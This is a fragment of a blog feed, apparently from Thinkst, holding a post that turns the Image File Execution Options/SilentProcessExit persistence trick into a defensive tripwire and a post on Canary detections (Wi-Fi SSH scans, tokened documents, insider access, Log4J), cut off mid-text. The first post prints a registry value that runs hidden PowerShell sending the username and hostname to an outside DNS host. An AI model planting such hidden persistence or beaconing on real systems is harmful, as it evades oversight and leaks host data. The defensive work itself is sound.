margin-bottom: 0; margin-top: 0;\"><a href=\"https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/\"><span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/</span></a></p>\n<div></div>\n<div>\n<div style=\"text-align: justify;\">In his blog post on &#8220;<a href=\"https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/\" rel=\"nofollow noopener\" target=\"_blank\">PERSISTENCE USING GLOBALFLAGS IN IMAGE FILE EXECUTION OPTIONS</a>&#8220;, Oddvar details how to persist in the registry and execute a command on a Windows system that runs in the background. This technique meets our requirements exactly. We needed a tripwire that would run in the background, not interfere with the original process, and allow us to make a custom callback/alert over DNS to alert a system administrator, or security team, that a suspicious command had been executed on the system.</div>\n<div style=\"text-align: justify;\"></div>\n<div>(We have also seen a debugger variation of this technique used by high profile attacks as well.)</div>\n<div></div>\n<div>\u201cThe attackers achieved this by having the SolarWinds process create an Image File Execution Options\u201d</div>\n<div></div>\n<div style=\"text-align: justify;\">We will repurpose the mechanics of this attacker technique and turn it into a defender tripwire!</div>\n<div style=\"text-align: justify;\"></div>\n<div style=\"text-align: justify;\">Oddvar demonstrated his technique\u00a0 to establish persistence and run an arbitrary executable, we will use it to reliably generate a remote alert.</div>\n<div></div>\n<div style=\"text-align: justify;\">This Canarytoken does not add any new executable to your system thanks to the wonders of Oddvar\u2019s technique, built-in tools and the Canarytoken server. We will be using Microsoft&#8217;s built-in SilentProcessExit monitoring, documented here:</div>\n</div>\n<div style=\"text-align: justify;\"></div>\n<div style=\"text-align: justify;\"><a href=\"https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/registry-entries-for-silent-process-exit\">Monitoring Silent Process Exit</a></div>\n<div></div>\n<div>\n<div>The specific registry settings we are interested in:</div>\n</div>\n<div></div>\n<div>\n<div></div>\n<div>Image File Execution Options\\{ProcessName}</div>\n<div>SilentProcessExit\\</div>\n<div>\u00a0 \u00a0 MonitorProcess</div>\n<div>\u00a0 \u00a0 ReportingMode</div>\n</div>\n<div></div>\n<div>\n<div></div>\n<div>You will see in the registry output above, we set this to the value 0x200. You may need to ensure that the process you wish to monitor isn\u2019t impacted by this setting.</div>\n</div>\n<div></div>\n<div>\n<div>\n<div>Next we set the ReportingMode to 0x1.</div>\n<div></div>\n<div><i>\u201cWhen silent exit is detected, the monitor process (specified in the Monitor Process box) is launched.\u201d</i></div>\n</div>\n<div>\n<div class=\"separator\" style=\"clear: both; text-align: center;\"></div>\n<p><i>\u00a0</i></p>\n</div>\n<div>\n<div>The bulk of the work for this alert is what we configure in the MonitorProcess value.</div>\n</div>\n<div></div>\n<div>\n<div>Let\u2019s break down the command to trigger this alert:</div>\n</div>\n<div></div>\n<div>\n<pre><span style=\"font-family: courier; font-size: medium;\"><b>\"</b></span><span style=\"font-family: courier; font-size: medium;\"><b>\"MonitorProcess\"=\"cmd.exe /c start /min powershell.exe -windowstyle hidden -command \\\"$($u=$(\\\\\\\"u$env:username\\\\\\\" -replace('[^\\\\x00-\\\\x7f]|\\\\s', ''))[0..63] -join '';$c=$(\\\\\\\"c$env:computername\\\\\\\" -replace('[^\\\\x00-\\\\x7f]|\\\\s', ''));Resolve-DnsName -Name \\\\\\\"$c.UN.$u.CMD.g6jjwnaukbfddgz51kh8tacdc.canarytokens.com\\\\\\\")\\\"\"</b></span></pre>\n</div>\n<div></div>\n<div></div>\n<div>\n<div>The various \\\\\\ sequences are to ensure proper escaping for both the command to run and to import into the registry.</div>\n<div></div>\n<div>First we call \u201c<b>cmd.exe /c start /min</b>\u201d. We do this as a trick to make the execution of our alert appear to run in the background. Even when we set -windowstyle hidden, with PowerShell, a window would appear, briefly but this wasn\u2019t acceptable to our goals. We also added some code to remove the non-unicode characters and to remove spaces. To ensure the alert data can be passed over a DNS query.</div>\n<div></div>\n<div>Next we run a PowerShell command to resolve our Canarytoken DNS.</div>\n<div></div>\n<div>We can leverage our ability to encode data into the DNS request. This is documented here</div>\n<div><a href=\"https://docs.canarytokens.org/guide/dns-token.html#creating-a-dns-token\">https://docs.canarytokens.org/guide/dns-token.html#creating-a-dns-token</a></div>\n<div></div>\n<div style=\"text-align: justify;\">Our lookup captures <b>computername.username.token</b>. Why PowerShell? We had some interesting collisions with trying to use the <b>%computername%</b> environment variable in say an nslookup command, due to the fact that MonitorProcess parses the registry key and uses the %c to report a status code. So after a few iterations, and experiment we found PowerShell the easiest way to collect the variables we need and add them into the alert.</div>\n</div>\n<div style=\"text-align: justify;\"></div>\n<h3 style=\"text-align: left;\">Risks/challenges/considerations.</h3>\n<div>\n<ul style=\"text-align: left;\">\n<li>Installing the .reg file requires admin privileges;</li>\n<li>Selecting the wrong &#8220;sensitive executable&#8221; will yield false-positive alerts;</li>\n<li>Hostname and Username are sent in clear-text in the alert;</li>\n<li>Process level alert: we only see that the process was executed, this approach does not give us command line granularity;</li>\n<li>These commands may, upon installation, look like attacker commands . Not the alert itself, but the installation, this is due to the fact we are repurposing an attacker trick;</li>\n<li>This alerts on all executable matches for the filename. If you need further refinement, you can customize this by setting the FilterFullPath registry key;</li>\n<li>Image Architecture, these keys were tested for x64.\u00a0 You may need to customize the settings if you are hoping to alert on x86/32 bit execution. C:\\Windows\\SysWOW64\\whoami.exe may evade the alert. Again, something to be aware of if you are looking into these for critical areas;</li>\n<li>This alert won\u2019t catch a renamed binary since the alert triggers on the process name.</li>\n</ul>\n<div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjYO6i3gl5D31m3hJ8e6jaVhWNxpoZdctDYXfnLHsF7hEp41-VfCcZsQY_s9Md7JdvbuoTc-12xuJZqudZFasf8hODpFZ_ovfbQEl2N9i9MfksIQoSllpKwWo4csGs-p1wIhpbAO_ncPpHnT9SRnUzpOXzKJLYujJ358TaAlw2tyX0qOV55rrQou6LD/s619/2022-09-05_22-34-25.png?ssl=1\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" height=\"100\" src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjYO6i3gl5D31m3hJ8e6jaVhWNxpoZdctDYXfnLHsF7hEp41-VfCcZsQY_s9Md7JdvbuoTc-12xuJZqudZFasf8hODpFZ_ovfbQEl2N9i9MfksIQoSllpKwWo4csGs-p1wIhpbAO_ncPpHnT9SRnUzpOXzKJLYujJ358TaAlw2tyX0qOV55rrQou6LD/w640-h100/2022-09-05_22-34-25.png?resize=640%2C100&#038;ssl=1\" width=\"640\" /></a></div>\n<div style=\"text-align: justify;\">For example, our Canarytoken alert won\u2019t fire if the binary has been renamed, but that is ok. If you need a tool that alerts on Process Execution, by OriginalFilename, Location and Command Lines, there are several to choose from.\u00a0 We just wanted to call that out, so you are aware of some of the limitations of these types of alerts.</div>\n</div>\n<div style=\"text-align: justify;\"></div>\n<div style=\"text-align: justify;\">\n<div>We do also see utility for teams to set tripwires for executables they never wish to see executing. Suppose we want to set a tripwire for mimikatz.exe.\u00a0 We can create the registry key, even though mimikatz.exe is not present on the system.\u00a0 Then if anyone ever executes a file with that name, we will receive an alert!\u00a0 You may also extend this to internal tools or executables as well.</div>\n<div>\n<h3>Choosing a binary to monitor:</h3>\n<div>Candidate sensitive commands:</div>\n<div>\n<ul>\n<li>Short lived, exits quickly</li>\n<li>Low frequency</li>\n<li>Low execution prevalence</li>\n<li>Indicative of suspicious or unusual activity.</li>\n</ul>\n</div>\n<div></div>\n<div>Each organization will need to look at command frequency, look into various threat reports and make that decision. If you need to disable a Canarytoken like this, you could for example set the Image File Execution Options \\GlobalFlags value to 0x0, then set it back to 0x200 if need be.</div>\n<div></div>\n<div>For example: We\u2019ve seen in nearly all ransomware attacks, schtasks.exe be leveraged. This binary at first blush seems like the ideal candidate to token but\u00a0 it turns out that schtasks runs frequently in the background, so it doesn\u2019t meet the candidate criteria of Low frequency.</div>\n<div></div>\n<div>Additionally Windows will create an event in the Application log when these events occur.\u00a0 These may allow teams further investigation data. The only requirement to record these events is that the Image File Execution Options\\{ProcessName}\\ GlobalFlags key be set to 0x200.</div>\n</div>\n<div></div>\n<div>\n<div>For those interested in additional details,\u00a0 you will also see the EventID 3000 in the Windows EventLogs to indicate Process Exit Monitor has occurred. Teams that are interested in a lightweight process monitoring record. Can simply create and set a GlobalFlags == 0x200 , and they can observe over time whether or not the process is frequent or not. Also they can determine if the process runs and ends quickly. This may also be a good Indicator of Compromise , for teams not expecting to see a particular process with this flag set.</div>\n<div></div>\n<div>As an example you can see below a quick way to search for these events and extract the Usernames.</div>\n</div>\n<div></div>\n<div>\n<div>$Events = Get-EventLog -LogName Application -InstanceId 3000 -Source &#8220;Microsoft-Windows-ProcessExitMonitor&#8221;</div>\n<div></div>\n<div>$Events | %{ $_.Username }</div>\n</div>\n<div></div>\n<h3>Conclusion:</h3>\n<div>\n<div>We looked at creating a new Canarytoken type that allows us to receive an alert when we specify an executable name that we want to watch for. We can do this by adding three registry keys and a PowerShell command to trigger a DNS lookup for us. We overload the DNS request with sufficient data to generate a meaningful alert for defenders. (<i>We wrap all of this up in one simple .reg file import</i>).</div>\n<div></div>\n<div style=\"text-align: left;\">We discussed some of the advantages and disadvantages of this approach. We are able to do this by leveraging the alert pipeline that you have, perhaps already used.\u00a0 If you would like to customize these tokens you certainly can too (and you can always run your own custom version of the free Canarytoken server. See the GitHub repo here <a href=\"https://github.com/thinkst/canarytokens)\">https://github.com/thinkst/canarytokens)</a>.</div>\n<div></div>\n<div>\n<div>Thank you for taking the time to read, and we welcome feedback on ways to improve and refine this new Sensitive command Canarytoken. Thanks again to the Applied Research team at Thinkst for all the testing and feedback to help us bring an idea forward that may prove helpful.</div>\n<div></div>\n</div>\n<h3>References</h3>\n<div>\n<div>\n<ul>\n<li><a href=\"https://thedfirreport.com/\">https://thedfirreport.com/</a></li>\n<li><a href=\"https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/\">https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/</a></li>\n<li><a href=\"https://www.hexacorn.com/blog/2019/09/19/silentprocessexit-quick-look-under-the-hood/\">https://www.hexacorn.com/blog/2019/09/19/silentprocessexit-quick-look-under-the-hood/</a></li>\n<li><a href=\"https://scorpiosoftware.net/2018/09/21/silent-process-exit-is-it-really/\">https://scorpiosoftware.net/2018/09/21/silent-process-exit-is-it-really/</a></li>\n<li><a href=\"https://docs.canarytokens.org/guide/dns-token.html#what-is-a-dns-token\">https://docs.canarytokens.org/guide/dns-token.html#what-is-a-dns-token</a></li>\n<li><a href=\"https://www.geoffchappell.com/studies/windows/win32/ntdll/api/rtl/rtlexec/openimagefileoptionskey.htm\">https://www.geoffchappell.com/studies/windows/win32/ntdll/api/rtl/rtlexec/openimagefileoptionskey.htm</a></li>\n<li><a href=\"https://attack.mitre.org/techniques/T1546/012/\">https://attack.mitre.org/techniques/T1546/012/</a></li>\n<li><a href=\"https://github.com/BishopFox/sliver/wiki/DNS-C2\">https://github.com/BishopFox/sliver/wiki/DNS-C2</a></li>\n<li><a href=\"https://unit42.paloaltonetworks.com/more-xhunt-new-powershell-backdoor-blocked-through-dns-tunnel-detection/\">https://unit42.paloaltonetworks.com/more-xhunt-new-powershell-backdoor-blocked-through-dns-tunnel-detection/</a></li>\n</ul>\n</div>\n</div>\n<div></div>\n<div></div>\n<div></div>\n</div>\n</div>\n<div></div>\n<div></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>"
                }
            ],
            "wfw_commentrss": "https://blog.thinkst.com/2022/09/sensitive-command-token-so-much-offense.html/feed",
            "slash_comments": "6",
            "post-id": "9"
        },
        {
            "title": "Canaries as Network Motion Sensors",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://blog.thinkst.com/feed",
                "value": "Canaries as Network Motion Sensors"
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://blog.thinkst.com/2022/08/canaries-as-network-motion-sensors.html"
                }
            ],
            "link": "https://blog.thinkst.com/2022/08/canaries-as-network-motion-sensors.html",
            "comments": "https://blog.thinkst.com/2022/08/canaries-as-network-motion-sensors.html#comments",
            "authors": [
                {
                    "name": "Casey Smith"
                }
            ],
            "author": "Casey Smith",
            "author_detail": {
                "name": "Casey Smith"
            },
            "published": "Mon, 29 Aug 2022 21:53:00 +0000",
            "published_parsed": [
                2022,
                8,
                29,
                21,
                53,
                0,
                0,
                241,
                0
            ],
            "tags": [
                {
                    "term": "Uncategorized",
                    "scheme": null,
                    "label": null
                },
                {
                    "term": "featured",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "https://blog.thinkst.com/2022/08/29/canaries-as-network-motion-sensors/",
            "guidislink": false,
            "summary": "Introduction This post is the first in a series by Canary customers where they detail how they integrated Canaries and Canarytokens into their security practice. This series hopes to showcase how organizations of varying sizes and structures deployed and acted on alerts to improve the security of their networks. Casey Smith recently joined Thinkst Labs, today he\u2019s sharing his experiences with Canaries and Canarytokens from his previous role as a customer. Background Prior to joining Thinkst, I worked for a number of years as the Principal analyst on a security team at an organization of ~3500 people with a highly regulated security practice. Our team was responsible for several systems: Email, Web Application, Proxy Server, Host based EDR, Application Control, Security Analytics, as well as Incident Response, internal testing and penetration testing. I would consider our team a fairly mature security team, with lots of tools, software, and telemetry to inform our security response. We found that Canaries detected activity that our other tooling and telemetry did not. Some of these examples have been modified slightly to avoid disclosure of certain internal details. Our team prioritized visibility, followed by detection, then prevention. We can\u2019t defend what we cannot see or [&#8230;]",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://blog.thinkst.com/feed",
                "value": "Introduction This post is the first in a series by Canary customers where they detail how they integrated Canaries and Canarytokens into their security practice. This series hopes to showcase how organizations of varying sizes and structures deployed and acted on alerts to improve the security of their networks. Casey Smith recently joined Thinkst Labs, today he\u2019s sharing his experiences with Canaries and Canarytokens from his previous role as a customer. Background Prior to joining Thinkst, I worked for a number of years as the Principal analyst on a security team at an organization of ~3500 people with a highly regulated security practice. Our team was responsible for several systems: Email, Web Application, Proxy Server, Host based EDR, Application Control, Security Analytics, as well as Incident Response, internal testing and penetration testing. I would consider our team a fairly mature security team, with lots of tools, software, and telemetry to inform our security response. We found that Canaries detected activity that our other tooling and telemetry did not. Some of these examples have been modified slightly to avoid disclosure of certain internal details. Our team prioritized visibility, followed by detection, then prevention. We can\u2019t defend what we cannot see or [&#8230;]"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://blog.thinkst.com/feed",
                    "value": "<h3 style=\"text-align: left;\">Introduction</h3>\n<p style=\"text-align: justify;\">This post is the first in a series by Canary customers where they detail how they integrated Canaries and Canarytokens into their security practice. This series hopes to showcase how organizations of varying sizes and structures deployed and acted on alerts to improve the security of their networks. Casey Smith recently joined Thinkst Labs, today he\u2019s sharing his experiences with Canaries and Canarytokens from his previous role as a customer.</p>\n<h3 style=\"text-align: justify;\">Background</h3>\n<p style=\"text-align: justify;\">Prior to joining Thinkst, I worked for a number of years as the Principal analyst on a security team at an organization of ~3500 people with a highly regulated security practice. Our team was responsible for several systems: Email, Web Application, Proxy Server, Host based EDR, Application Control, Security Analytics, as well as Incident Response, internal testing and penetration testing. I would consider our team a fairly mature security team, with lots of tools, software, and telemetry to inform our security response. We found that Canaries detected activity that our other tooling and telemetry did not.</p>\n<p style=\"text-align: center;\"><i>Some of these examples have been modified slightly to avoid disclosure of certain internal details.</i></p>\n<p style=\"text-align: justify;\"><span style=\"text-align: left;\">Our team prioritized visibility, followed by detection, then prevention. We can\u2019t defend what we cannot see or detect. This philosophy helped our team gain great insight into our network, systems and applications. EDR for example, would allow our team to search for any host, any process, that makes a DNS request. We could then correlate that with other systems to react to unauthorized, or suspicious access. We still found incredible utility from Canaries in these cases and they are a much lower cost than many of the other tools we purchased and deployed. We were able to leverage Canaries to detect both internal and external attacks.</span></p>\n<p style=\"text-align: justify;\">While no defense is perfect, this model informed our approach, along with a tight feedback cycle between detection and prevention.</p>\n<div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYJhXOovXKaNNLFVNz2DANbmfkcue1QrLQUA_69xMGGZVGekkEXCv13LKSZ6QZWhQ7pMm-hVErchqgUGMPSWU5Z88YPH3BAt7LKtkpWAtwjX0eVA5ITBHxiol2DGd2sxMlB6kESfShvigNG_W_MMHwUUuL9zt-fiTCUfiUJUEfSpCCYMHCIPRHFL_A/s761/2022-08-29_22-53-58.png?ssl=1\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" height=\"448\" src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYJhXOovXKaNNLFVNz2DANbmfkcue1QrLQUA_69xMGGZVGekkEXCv13LKSZ6QZWhQ7pMm-hVErchqgUGMPSWU5Z88YPH3BAt7LKtkpWAtwjX0eVA5ITBHxiol2DGd2sxMlB6kESfShvigNG_W_MMHwUUuL9zt-fiTCUfiUJUEfSpCCYMHCIPRHFL_A/w640-h448/2022-08-29_22-53-58.png?resize=640%2C448&#038;ssl=1\" title=\"https://cacm.acm.org/magazines/2019/6/237003-engineering-trustworthy-systems/fulltext\" width=\"640\" /></a></div>\n<div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://cacm.acm.org/magazines/2019/6/237003-engineering-trustworthy-systems/fulltext\">https://cacm.acm.org/magazines/2019/6/237003-engineering-trustworthy-systems/fulltext</a></div>\n<p style=\"clear: both; text-align: left;\">Some questions we constantly tried to ask of ourselves:</p>\n<p style=\"clear: both; text-align: left;\">\n<ol style=\"text-align: left;\">\n<li>How do we know this tool is working?</li>\n<li>Have we tested this tool?</li>\n<li>How do we know if an attacker is moving around in our network?</li>\n<li>What tools work to detect already compromised systems, and lateral movement?</li>\n</ol>\n<p style=\"clear: both; text-align: justify;\">Below is a diagram of Mandiant&#8217;s Standard intrusion model, as attackers traverse from left to right, and I\u2019ve annotated it with where we thought about inserting canaries for detection.</p>\n<div class=\"separator\" style=\"clear: both; text-align: justify;\"><a href=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgIThyWdGceDJ-fccS5lyPqFZ8DKJ-kJ1ioupgBV5mBPb2sdriEiPtWpzmH8_Xvq9YOnS4tK-CnfGFyQW8Ih2zYfvR98cMO2_eQj0SBb5Eqd45FIVJTISx1AUn3R6fSGd9y42-DcbMQQsHIIP2zzEd9R-B6TDhOai9AtHstkZ8rWRnAqmWtP71H7zfQ/s935/2022-08-29_23-04-05.png?ssl=1\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" class=\"aligncenter\" height=\"226\" src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgIThyWdGceDJ-fccS5lyPqFZ8DKJ-kJ1ioupgBV5mBPb2sdriEiPtWpzmH8_Xvq9YOnS4tK-CnfGFyQW8Ih2zYfvR98cMO2_eQj0SBb5Eqd45FIVJTISx1AUn3R6fSGd9y42-DcbMQQsHIIP2zzEd9R-B6TDhOai9AtHstkZ8rWRnAqmWtP71H7zfQ/w640-h226/2022-08-29_23-04-05.png?resize=640%2C226&#038;ssl=1\" width=\"640\" /></a></div>\n<div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://www.mandiant.com/resources/wmi-vs-wmi-monitor\">https://www.mandiant.com/resources/wmi-vs-wmi-monitor</a></div>\n<p style=\"clear: both; text-align: justify;\">Once an attacker gains initial access, they often do not know where they are. They have to discover, and enumerate services, targets, find credentials or elevate privileges. In essence they bump around, and this can be a defender advantage. This can be done a number of ways, local and remote:</p>\n<p style=\"clear: both;\">\n<ol style=\"text-align: left;\">\n<li style=\"text-align: justify;\">Port Scanning</li>\n<li>Active Directory Enumeration</li>\n<li>Internal Sites, SharePoint, Confluence</li>\n<li>Network Shares, Documents</li>\n<li>Local accounts, Local Privilege escalation</li>\n<li>Exploits, Vulnerable services, Misconfigurations (Windows Services, etc.)</li>\n</ol>\n<p style=\"text-align: justify;\">This can be to the defender\u2019s advantage to shape the environment early on for the attacker.\u00a0 What we want to do is present some tempting targets to the attacker, and have them attempt access. This tipoff should then be enough for us to investigate further, if they trigger an alert.\u00a0 Tempting targets can be files, (Canarytokens) , or Network Services (Canaries). This blog seeks to share some real-world approaches for creating those targets, as well as challenges and opportunities we faced. Below we explore in detail four scenarios:</p>\n<ol style=\"text-align: left;\">\n<li>SSH Detection on Guest Wireless</li>\n<li>Cyber Insurance Documents &#8211; CanaryTokens</li>\n<li>The Alert that should never happen</li>\n<li>Log4J Zero Day Detection, Remediation</li>\n</ol>\n<h3 style=\"text-align: left;\">SSH Detection on Guest Wireless</h3>\n<p style=\"text-align: justify;\">Like many corporate offices we offered free guest Wi-Fi to visitors. At the time there were few controls and little monitoring there, except for an Acceptable Use Policy. This we decided would be a great place to see if anyone was attempting attacks against our exposed Guest Wi-Fi service. We could then detect attacks and correlate attacks across multiple locations.\u00a0 We set up a Physical Canary in our Guest Wireless VLAN. It took us about 2 weeks from the time we decided to deploy, to get the necessary approvals and coordination, attested and validated etc\u2026 This will vary from organization to organization. The way our Wi-Fi was configured, we put the bird in the first VLAN just past the Access Point. Access Points for example, in our configuration, prevent one Wi-Fi guest from sending packets to another. So the natural choice was to place the Canary in a VLAN that was accessible from any Wi-Fi guest. Finally we had the bird in place. Our team deployed a Linux profile with SSH, Web Server, and Port Scan Detection. We tested the alerting infrastructure with our integrations to ensure the analysts would be ready. Once this was validated, the tripwire was set and we waited. It did not take very long for an alert to fire.</p>\n<p style=\"text-align: justify;\">It took just a few days before we received our first alert on Port Scanning and SSH attempts for the Wi-Fi Canary. We immediately started working our Incident Response process to validate the alert was legitimate. Even if it is a false positive, it has been my experience that teams learn by running the alert to the ground, to help further tune and improve.\u00a0 Typical alert volumes (even without Canaries) would vary week to week, But on average the team would do a complete investigation on anywhere from 5-10 alerts per week, on the low end. These ranged from malicious email that bypassed our spam filtering, to endpoint alerts on suspicious files, and suspicious URLs visited. In almost every case, even if the alert was a false positive, the investigating analyst learned more about the log sources, and gained experience querying them. Also this allowed us to create documentation and surface any gaps or places where we hit a dead end in an investigation.</p>\n<p style=\"text-align: justify;\">Once we determined the alert was valid, we reached out to the Network team for any indicators, logs or other data on the connected attacking host. Our alert provided us three dimensions, a Time Stamp, a Source IP address, and User Name/Password attempted. We wanted to then research any and all activity for that host as far back as we could get. To our delight, the Network team had immense insight into Wi-Fi. They were able to present us complete logs to validate the alert and also provide details of where the attacking device was in the building!</p>\n<p style=\"text-align: justify;\">For more one example on how see <a href=\"https://documentation.meraki.com/General_Administration/Monitoring_and_Reporting/Placing_Devices_on_the_Map_in_Dashboard\" rel=\"nofollow noopener\" target=\"_blank\">this blog</a>.</p>\n<p style=\"clear: both;\">It looked something like this:</p>\n<div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj4xawcXueyfFAMGsPCgHkp7abcFnYguxcWuQX0nDLFmlP2ELwKz7mL2Cad1YTUw7GO1pYTfFmSpd5SHicuC3U4zcphiwc6eOV8n9CkDAPKauCw_v3oCcF9ca6ibvT6tZr6CRVTBOK_A1NKItPghqCe6bY1ppb65d2rhhIW9LKNMY5v87V1jsvSgmto/s946/2022-08-29_23-10-00.png?ssl=1\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" height=\"136\" src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj4xawcXueyfFAMGsPCgHkp7abcFnYguxcWuQX0nDLFmlP2ELwKz7mL2Cad1YTUw7GO1pYTfFmSpd5SHicuC3U4zcphiwc6eOV8n9CkDAPKauCw_v3oCcF9ca6ibvT6tZr6CRVTBOK_A1NKItPghqCe6bY1ppb65d2rhhIW9LKNMY5v87V1jsvSgmto/w640-h136/2022-08-29_23-10-00.png?resize=640%2C136&#038;ssl=1\" width=\"640\" /></a></div>\n<p style=\"clear: both;\">We wrapped up our investigation and dealt with the rogue host that had:</p>\n<p style=\"clear: both;\">\n<ol style=\"text-align: left;\">\n<li>Scanned our Guest Wi-Fi, and</li>\n<li>Attempted an unauthorized SSH login.</li>\n</ol>\n<p style=\"clear: both; text-align: justify;\">This was our first real win with a Canary detection and word began to spread within the organization that we had some pretty exceptional tools. This can be helpful. In reality, it was good testing and team work. Security teams never investigate in isolation, they require close coordination with other teams, web administrators, networking teams, and endpoint teams. This incident helped reinforce our classification of these Canaries as \u201c<i>Network Motion Sensors</i>&#8220;. We want to know when someone is attempting to move around on our network. Canaries may extend the range and reach of your detection. Places where you cannot install software on endpoints. Conference Room scheduling panels, IOT/ICS segments, or other sensitive segments etc\u2026</p>\n<h3 style=\"clear: both; text-align: justify;\">Cyber Insurance Documents &#8211; CanaryTokens</h3>\n<p style=\"clear: both; text-align: justify;\">While reading recent public Ransomware reports, we learned that some Ransomware crews were reading Cyber Insurance Policies and targeting those organizations for payments.</p>\n<p style=\"clear: both; text-align: justify;\">(See <a href=\"https://www.npr.org/2021/07/15/1016572979/companies-may-be-flagging-themselves-for-hackers-by-buying-cybersecurity-insuran\" rel=\"nofollow noopener\" target=\"_blank\">this story for example</a>)</p>\n<p style=\"clear: both;\">So we decided that these Policy Documents were a prime candidate for placing Canarytokens. Canarytokens (for customers) allows you to upload internal documents, and tokenize them.</p>\n<div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhFpaqqlqNuDbkV7pdeayF3B8oV4lvaLMLI2BaaEjdJGjMMoaAKdLoo1106V3M2iMOnhNaxk_tZAhtjHRypZ6RF2HrMbCXr-hQLx1t1R-Gpdn8ctXv86vtlzd1c6rVMTGCj2yr9byWLBOUu6dsXY1QwCuxsx1EVHmo0pCXUTsVV7_Xh_BmLMTcn19ll/s927/2022-08-29_23-14-03.png?ssl=1\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" height=\"384\" src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhFpaqqlqNuDbkV7pdeayF3B8oV4lvaLMLI2BaaEjdJGjMMoaAKdLoo1106V3M2iMOnhNaxk_tZAhtjHRypZ6RF2HrMbCXr-hQLx1t1R-Gpdn8ctXv86vtlzd1c6rVMTGCj2yr9byWLBOUu6dsXY1QwCuxsx1EVHmo0pCXUTsVV7_Xh_BmLMTcn19ll/w640-h384/2022-08-29_23-14-03.png?resize=640%2C384&#038;ssl=1\" width=\"640\" /></a></div>\n<p style=\"clear: both; text-align: justify;\">\n<p style=\"clear: both; text-align: justify;\">We embedded a few policies inside a shared folder within the organization. These documents were placed alongside real policies, and located in a read-only global share. It wouldn\u2019t take long before the alert fired and we caught an unauthorized read of these files.</p>\n<p style=\"clear: both; text-align: justify;\">When we built the alert, it had context on who was authorized within the organization to read these documents. In an attempt to read these, the security team was to follow a rapid escalation route to curate this alert. We had an unauthorized attempt to read these files! We were then able to use the EDR tool to review activity of the user and endpoint that had opened the documents.</p>\n<p style=\"clear: both; text-align: justify;\">This was a great win for catching unauthorized document access. Some teams will argue that the same events could be fired in with Windows Alerts and logs, and while true, Canarytokens in well placed Word files, provided faster detection and validation.</p>\n<h3 style=\"clear: both; text-align: justify;\">Alerts that should never have happen</h3>\n<p style=\"clear: both; text-align: justify;\">Like most companies, we had some segments that were highly protected and we were fairly confident would never be reached. For completeness, we decided to create some fake documentation on an internal web page, then deployed some Executable and DLLs along with fake instructions on usage and access. We hoped this would never go off.</p>\n<p style=\"clear: both; text-align: justify;\">What happened next was quite unexpected. An internal user with access to the location where we placed the package ran the tokened executable. However, it was WAY out of this user\u2019s role to ever attempt access to this segment. So when teams worry about insider threats, this was a great real-world example of catching those threats. In the end, this particular employee received disciplinary action, due to the exploration and execution of binaries, outside their described role.. Within the Canary portal, or Canarytokens.org, teams can create and upload basic executable files that alert when executed, as well as when the file properties are read. This can immediately alert you to someone attempting to gain access to a more restricted area.</p>\n<h3 style=\"clear: both; text-align: justify;\">Log4J Product Zero Day Detection, Remediation</h3>\n<p style=\"clear: both; text-align: justify;\">The final Canary use case I wanted to highlight is related to the Log4J vulnerability. When the Log4J vulnerability (Log4Shell) was announced in early December, our team sprang into action. What you may not have heard, is the private story of how Canaries helped us validate a ZeroDay in a product. At that time we had been working with an Advanced Red team that was struggling to gain access from external only vantage. This team had the ability to create custom exploits for targets unique to their clients. So they had extensive exploit development experience. The Log4J vulnerability timeline <a href=\"https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/\" rel=\"nofollow noopener\" target=\"_blank\">seen here</a>.</p>\n<div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgBgKSjJZ1O-W3arPhDj-x_DUc3W5tuCF8VKic7L4LOlvvzj_fSwMVh14h3sErcP1Xzeq5qg_plN-C6-nvQfnPNBoskYZRZ-I_MJtes1I6ga75U1dX_YXnBvsJ9OXxgpedN3F-gYNFP_hibYXDOpX97g2uskYmu9LPp1J6rVcU4z_C7LwAF4yLjNFs_/s1280/Log4j-Timeline-1.png?ssl=1\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" height=\"360\" 